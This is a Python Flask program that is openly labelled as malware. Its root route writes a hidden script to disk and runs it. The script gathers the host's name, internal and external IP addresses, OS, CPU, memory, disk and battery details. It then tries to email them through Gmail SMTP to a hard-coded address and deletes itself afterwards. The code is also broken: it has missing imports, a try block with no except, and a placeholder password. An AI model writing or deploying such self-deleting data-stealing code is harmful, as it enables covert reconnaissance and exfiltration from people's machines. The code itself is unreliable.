import subprocess
from flask import Flask
app = Flask(__name__)

@app.route('/')
def default():
    code = """
import socket
import requests
import platform
import os
import psutil

def get_ip_details():
    host_name = socket.gethostname()

    try:
        ip_address = socket.gethostbyname(host_name)
        fqdn = socket.getfqdn()
        ip_addresses = socket.gethostbyname_ex(fqdn)
        external_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
        cpus = os.cpu_count()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        host_ip = socket.gethostbyname(socket.gethostname())
        battery = psutil.sensors_battery()
        print(f"Battery Percentage: {battery.percent}%")
        
        print(f"External IP Address: {external_ip}")
        print(f"Hostname: {host_name}")
        print(f"IP Address (associated with hostname): {ip_address}")
        print(f"Fully Qualified Domain Name (FQDN): {fqdn}")
        print(f"All IP Addresses (associated with FQDN): {', '.join(ip_addresses[2])}")

        print(f"Hostname: {socket.gethostname()}")
        print(f"OS: {platform.system()} {platform.release()} {platform.architecture()}")
        print(f"Python Version: {platform.python_version()}")

        print(f"CPU Cores: {cpus}")

        print(f"Total Memory: {memory.total} bytes")
        print(f"Available Memory: {memory.available} bytes")

        print(f"Total Disk Space: {disk.total} bytes")
        print(f"Free Disk Space: {disk.free} bytes")

        print(f"IP Address: {host_ip}")

        systemData = {
            "ip_address":ip_address,
            "ip_addresses":ip_addresses,
            "host_name":host_name,
            "fqdn":fqdn,
            "external_ip":external_ip,
            "cpus":cpus,
            "memory":memory,
            "disk":disk,
            "host_ip":host_ip
        }
        sndto = "rahulkallingal9@gmail.com"
        subject = "subject"
        messagebody = systemData
        smtpserver = "smtp.gmail.com"
        smtpport = 587
        tlsauth = "Yes"
        frmaddr = "rahulkallingal05@gmail.com"
        passwd = "XXXXXXXXXX"
        if messagebody:
            msgbody = messagebody
        else:
            msgbody = "The mail system is ready to send the data to the end user"
        msg = EmailMessage()
        msg.set_type('text/html')
        msg.set_content(msgbody, subtype='html')
        msg['Subject'] = subject
        msg['From'] = frmaddr
        msg['To'] = sndto
        try:
            # Send the message via our own SMTP server.
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.login(frmaddr, passwd)
            server.send_message(msg)
            server.quit()

    except socket.error as e:
        print(f"Error: {e}")
get_ip_details()
os.remove("systemdetails.py")
"""
    with open("systemdetails.py","w") as file:
        file.write(code)

    subprocess.run(["python3", "systemdetails.py"])
        
    return "MALWARE IS RUNNING"

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5000)
